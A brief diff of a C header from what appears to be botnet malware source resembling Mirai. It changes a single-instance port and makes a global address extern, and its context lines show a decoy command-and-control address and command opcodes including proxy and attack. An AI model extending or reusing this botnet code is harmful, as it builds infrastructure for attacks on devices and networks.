@@ -17,7 +17,7 @@ typedef uint16_t port_t;
 
 #define INET_ADDR(o1,o2,o3,o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))
 
-#define SINGLE_INSTANCE_PORT 48101
+#define SINGLE_INSTANCE_PORT 48102
 
 #define FAKE_CNC_ADDR   INET_ADDR(65,222,202,53)
 #define FAKE_CNC_PORT   80
@@ -28,7 +28,7 @@ typedef uint16_t port_t;
 #define CNC_OP_PROXY        0x30
 #define CNC_OP_ATTACK       0x40
 
-ipv4_t LOCAL_ADDR;
+extern ipv4_t LOCAL_ADDR;
 
 #ifdef DEBUG
 static char *outptr;
